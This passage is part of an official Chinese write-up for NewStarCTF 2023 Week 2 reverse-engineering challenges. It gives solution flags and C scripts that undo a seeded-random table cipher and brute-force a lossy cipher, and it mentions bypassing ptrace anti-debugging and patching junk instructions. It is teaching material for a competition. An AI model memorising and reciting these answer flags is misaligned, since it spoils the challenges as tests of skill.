new_table))</div></div><p ql-global="true" line="zfFj">输入正确的username和password  会跳转到Mainactivity2......然后就是  原神！启动！</p><h1><div ql-global="true" line="krQJ" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><br></div></h1><h1><div ql-global="true" line="Uwyl" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>R4ndom</div></h1><ul data-list-style="circle"><li ql-global="true" line="kljX" class="bullet-item"><strong>考点</strong>：伪随机、反调试</li></ul><ul data-list-style="circle"><li ql-global="true" line="sPbH" class="bullet-item"><strong>FLAG</strong>：flag{B8452786-DD8E-412C-E355-2B6F27DAB5F9}</li></ul><ul data-list-style="circle"><li ql-global="true" line="sQRB" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="ygXN"><code class="ql-inlinecode">.init_array</code>段中存在反调试和通过<code class="ql-inlinecode">srand</code>函数设置随机数种子，<code class="ql-inlinecode">init_array</code>段的函数执行时机早于main函数</p><p ql-global="true" class="ql-align-center" line="hZxi"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="1081" src="./NewStarCTF 2023 Week2 官方WriteUp_files/3122956790.png" ori-height="151" data-src="https://uploader.shimo.im/f/CSXJN66iiEKJN3kv.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="JUga">通过<code class="ql-inlinecode">ptrace</code>实现反调试，<a class="ql-link" href="https://xz.aliyun.com/t/6882#toc-1?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTgxNTMzMzYsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTY5ODE1MzAzNiwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODMzMzU1NDY5MH0.NYa72qmxddXM9lcSzdala4nuJOWnkiUXyE99uwpsEwA" target="_blank" rel="noopener noreferrer nofollow">学习文章</a>。只需要Patch指令或者修改ZF标志位的值即可完成绕过</p><p ql-global="true" class="ql-align-center" line="PclT"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="auto" height="auto" ori-width="761" src="./NewStarCTF 2023 Week2 官方WriteUp_files/260923288.png" ori-height="153" data-src="https://uploader.shimo.im/f/k2AEX1x3vUatHXyB.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="Kvvw">设置随机数种子</p><p ql-global="true" class="ql-align-center" line="ZVfs"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="393px" height="auto" ori-width="449" src="./NewStarCTF 2023 Week2 官方WriteUp_files/3634281575.png" ori-height="106" data-src="https://uploader.shimo.im/f/W2nr8CArj00iKhOL.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="WI1I">密文赋值和校验部分省略，主要看加密部分，阅读这段代码可知首先把输入字符串的单个字符值和<code class="ql-inlinecode">rand()%255</code>的值相加，将相加的结果作为索引来获取Table中的值</p><p ql-global="true" class="ql-align-center" line="7RSV"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="616px" height="auto" ori-width="1355" src="./NewStarCTF 2023 Week2 官方WriteUp_files/2593646665.png" ori-height="144" data-src="https://uploader.shimo.im/f/OamBH8uwIw3Kn3rZ.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="XxuF">由于设置了随机数种子，所以每次<code class="ql-inlinecode">rand()</code>的结果都是一样的，这就是伪随机。</p><p ql-global="true" line="uP7l">所以我们只需要获取到密文和Table之后进行比对，得到密文在Table的位置，将得到的索引减去rand()%255的结果就是我们的flag，脚本如下，由于rand函数在Windows和Linux环境下得到的结果不相同，所以需要将下面的脚本运行在Linux环境下</p><div class="ql-code-block-container" data-language="cpp" word-wrap="" spellcheck="false"><div line="FYp8" data-language="cpp" class="ql-code-block ql-word-wrap-true"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span></div><div line="9t7p" data-language="cpp" class="ql-code-block ql-word-wrap-true"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span></div><div line="5pLa" data-language="cpp" class="ql-code-block ql-word-wrap-true"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span></div><div line="9oCF" data-language="cpp" class="ql-code-block ql-word-wrap-true"><span class="hljs-type">__uint8_t</span> Table[<span class="hljs-number">256</span>] = {</div><div line="YiwZ" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0x63</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x76</span>,</div><div line="Hd3y" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0xCA</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0xC0</span>,</div><div line="ch3g" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x15</span>,</div><div line="oCdV" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0x04</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x75</span>,</div><div line="TahD" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0x09</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x84</span>,</div><div line="nOXz" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0xCF</span>,</div><div line="8lKE" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xA8</span>,</div><div line="9WGT" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0x51</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0xD2</span>,</div><div line="KEiQ" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x73</span>,</div><div line="HeAA" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0x60</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xDB</span>,</div><div line="aYVT" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x79</span>,</div><div line="wy2p" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x08</span>,</div><div line="Fx4q" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8A</span>,</div><div line="y8uV" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x9E</span>,</div><div line="5RFC" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0xDF</span>,</div><div line="01mc" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x16</span>};</div><div line="p1XG" data-language="cpp" class="ql-code-block ql-word-wrap-true"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></div><div line="4IVv" data-language="cpp" class="ql-code-block ql-word-wrap-true"><span class="hljs-function"></span>{</div><div line="7XvM" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-built_in">srand</span>(<span class="hljs-number">1400333646</span>);</div><div line="xY9y" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-type">__uint8_t</span> enc[<span class="hljs-number">42</span>] = {</div><div line="rE2b" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x2E</span>,</div><div line="fdNj" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x38</span>,</div><div line="N265" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-number">0x07</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0xA6</span>};</div><div line="lmft" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">42</span>; ++i)</div><div line="uCT3" data-language="cpp" class="ql-code-block ql-word-wrap-true">    {</div><div line="wiHj" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">256</span>; ++j)</div><div line="JhDf" data-language="cpp" class="ql-code-block ql-word-wrap-true">        {</div><div line="piHI" data-language="cpp" class="ql-code-block ql-word-wrap-true">            <span class="hljs-keyword">if</span> (Table[j] == enc[i])</div><div line="CPDx" data-language="cpp" class="ql-code-block ql-word-wrap-true">            {</div><div line="V98D" data-language="cpp" class="ql-code-block ql-word-wrap-true">                <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, (j - <span class="hljs-built_in">rand</span>() % <span class="hljs-number">255</span>));</div><div line="oEF7" data-language="cpp" class="ql-code-block ql-word-wrap-true">            }</div><div line="LUmh" data-language="cpp" class="ql-code-block ql-word-wrap-true">        }</div><div line="d59v" data-language="cpp" class="ql-code-block ql-word-wrap-true">    }</div><div line="2Zp4" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</div><div line="MVSN" data-language="cpp" class="ql-code-block ql-word-wrap-true">}</div></div><h1><div ql-global="true" line="3Ga1" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><br></div></h1><h1><div ql-global="true" line="u9F8" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>easy_enc</div></h1><ul data-list-style="circle"><li ql-global="true" line="UqbE" class="bullet-item"><strong>考点</strong>：单字符爆破</li></ul><ul data-list-style="circle"><li ql-global="true" line="uAd0" class="bullet-item"><strong>FLAG</strong>：flag{BruteForceIsAGoodwaytoGetFlag}</li></ul><ul data-list-style="circle"><li ql-global="true" line="xGXl" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="nXPk">首先通过字符串定位到main函数，程序首先把四个加密函数的地址存储在数组中，之后遍历该数组对函数进行调用</p><p ql-global="true" class="ql-align-center" line="Whm2"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="506px" height="auto" ori-width="716" src="./NewStarCTF 2023 Week2 官方WriteUp_files/1011179279.png" ori-height="268" data-src="https://uploader.shimo.im/f/4MnA7rFaP7Rid7gL.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="eigS">接下来查看四个加密函数的内容，其中前三个加密函数都是可逆的，而第四个加密函数由于乘法会导致溢出(Char类型)所以没办法逆回去。</p><p ql-global="true" class="ql-align-center" line="9S7T"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="431px" height="auto" ori-width="631" src="./NewStarCTF 2023 Week2 官方WriteUp_files/2220261127.png" ori-height="474" data-src="https://uploader.shimo.im/f/OL3Hwwx7X9DVsYkG.png!thumbnail" crossorigin="anonymous"></span></span></span><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="432px" height="auto" ori-width="605" src="./NewStarCTF 2023 Week2 官方WriteUp_files/1284897844.png" ori-height="396" data-src="https://uploader.shimo.im/f/ZgTORlBecNiMypSq.png!thumbnail" crossorigin="anonymous"></span></span></span><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="432px" height="auto" ori-width="659" src="./NewStarCTF 2023 Week2 官方WriteUp_files/3876819488.png" ori-height="250" data-src="https://uploader.shimo.im/f/q0qN0jVBAlFd8FAy.png!thumbnail" crossorigin="anonymous"></span></span></span><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="433px" height="auto" ori-width="591" src="./NewStarCTF 2023 Week2 官方WriteUp_files/3743718511.png" ori-height="260" data-src="https://uploader.shimo.im/f/YBxwjrEvspHMKXeu.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="piWP">由于给出了flag的格式，我们可以爆破求解，脚本如下</p><div class="ql-code-block-container" data-language="cpp" word-wrap="" spellcheck="false"><div line="STYk" data-language="cpp" class="ql-code-block ql-word-wrap-true"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span></div><div line="e3Gj" data-language="cpp" class="ql-code-block ql-word-wrap-true"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span></div><div line="R7u5" data-language="cpp" class="ql-code-block ql-word-wrap-true"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span></div><div line="6FOp" data-language="cpp" class="ql-code-block ql-word-wrap-true"><span class="hljs-function"></span>{</div><div line="AIxz" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-type">__uint8_t</span> enc[<span class="hljs-number">100</span>] = {<span class="hljs-number">0xE8</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x8</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x0</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0xC</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x30</span>};</div><div line="NapJ" data-language="cpp" class="ql-code-block ql-word-wrap-true"><br></div><div line="LJtk" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-type">char</span> key[<span class="hljs-number">20</span>] = <span class="hljs-string">"NewStarCTF"</span>;</div><div line="NX39" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">29</span>; ++i){</div><div line="4odZ" data-language="cpp" class="ql-code-block ql-word-wrap-true">        <span class="hljs-keyword">for</span> (<span class="hljs-type">__uint8_t</span> j = <span class="hljs-number">32</span>; j &lt;= <span class="hljs-number">127</span>; ++j){</div><div line="E7Dg" data-language="cpp" class="ql-code-block ql-word-wrap-true">            <span class="hljs-type">__uint8_t</span> tmp = j;</div><div line="FXDT" data-language="cpp" class="ql-code-block ql-word-wrap-true">            <span class="hljs-keyword">if</span> (j &gt;= <span class="hljs-string">'A'</span> &amp;&amp; j &lt;= <span class="hljs-string">'Z'</span>){</div><div line="9RUb" data-language="cpp" class="ql-code-block ql-word-wrap-true">                j = (j - <span class="hljs-string">'A'</span> + <span class="hljs-number">13</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">'A'</span>;</div><div line="M1yU" data-language="cpp" class="ql-code-block ql-word-wrap-true">            }</div><div line="O7nW" data-language="cpp" class="ql-code-block ql-word-wrap-true">            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (j &gt;= <span class="hljs-string">'0'</span> &amp;&amp; j &lt;= <span class="hljs-string">'9'</span>){</div><div line="xTpy" data-language="cpp" class="ql-code-block ql-word-wrap-true">                j = (j - <span class="hljs-string">'0'</span> + <span class="hljs-number">3</span>) % <span class="hljs-number">10</span> + <span class="hljs-string">'0'</span>;</div><div line="I08V" data-language="cpp" class="ql-code-block ql-word-wrap-true">            }</div><div line="qgzM" data-language="cpp" class="ql-code-block ql-word-wrap-true">            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (j &gt;= <span class="hljs-string">'a'</span> &amp;&amp; j &lt;= <span class="hljs-string">'z'</span>){</div><div line="RscC" data-language="cpp" class="ql-code-block ql-word-wrap-true">                j = (j - <span class="hljs-string">'a'</span> + <span class="hljs-number">8</span>) % <span class="hljs-number">26</span> + <span class="hljs-string">'a'</span>;</div><div line="8eGW" data-language="cpp" class="ql-code-block ql-word-wrap-true">            }</div><div line="e3qq" data-language="cpp" class="ql-code-block ql-word-wrap-true">            j += key[i % <span class="hljs-built_in">strlen</span>(key)];</div><div line="BD4f" data-language="cpp" class="ql-code-block ql-word-wrap-true">            j = ~j;</div><div line="EQET" data-language="cpp" class="ql-code-block ql-word-wrap-true">            j *= <span class="hljs-number">52</span>;</div><div line="bHOe" data-language="cpp" class="ql-code-block ql-word-wrap-true">            <span class="hljs-keyword">if</span> (j == enc[i]) {</div><div line="P7zZ" data-language="cpp" class="ql-code-block ql-word-wrap-true">                <span class="hljs-keyword">if</span> ((tmp &gt;= <span class="hljs-string">'A'</span> &amp;&amp; tmp &lt;= <span class="hljs-string">'Z'</span>) || (tmp &gt;= <span class="hljs-string">'a'</span> &amp;&amp; tmp &lt;= <span class="hljs-string">'z'</span>)){</div><div line="lRMY" data-language="cpp" class="ql-code-block ql-word-wrap-true">                    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"%c"</span>, tmp);</div><div line="AJmy" data-language="cpp" class="ql-code-block ql-word-wrap-true">                }</div><div line="V4nN" data-language="cpp" class="ql-code-block ql-word-wrap-true">            }</div><div line="MXRW" data-language="cpp" class="ql-code-block ql-word-wrap-true">            j = tmp;</div><div line="el7r" data-language="cpp" class="ql-code-block ql-word-wrap-true">        }</div><div line="JxEj" data-language="cpp" class="ql-code-block ql-word-wrap-true">    }</div><div line="SYdy" data-language="cpp" class="ql-code-block ql-word-wrap-true">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</div><div line="5dSw" data-language="cpp" class="ql-code-block ql-word-wrap-true">}</div></div><p ql-global="true" line="y34Y">flag{BruteForceIsAGoodwaytoGetFlag}</p><p ql-global="true" line="J5eO"><br></p><h1><div ql-global="true" line="1R4t" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Petals</div></h1><ul data-list-style="circle"><li ql-global="true" line="nngb" class="bullet-item"><strong>考点：</strong>花指令、MD5</li></ul><ul data-list-style="circle"><li ql-global="true" line="Fp5M" class="bullet-item"><strong>flag：</strong>flag{d780c9b2d2aa9d40010a753bc15770de}</li></ul><ul data-list-style="circle"><li ql-global="true" line="kn9v" class="bullet-item"><strong>解题步骤：</strong></li></ul><p ql-global="true" line="I4fB"> 发现花指令，人工patch掉花指令<span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="1320" height="auto" ori-width="1320" src="./NewStarCTF 2023 Week2 官方WriteUp_files/Y0X@`[JW@T2]6E7DOAL~K)A.png" ori-height="372" data-src="https://uploader.shimo.im/f/akYPs2d4IUw70aBO.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" line="jdQ6">进入main函数后，再进入加密函数sub_1209，找到加密逻辑</p><p ql-global="true" line="02hU"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="713" height="auto" ori-width="713" src="./NewStarCTF 2023 Week2 官方WriteUp_files/S}__Q4XFT%5Z0}G_H%YVOW7.png" ori-height="370" 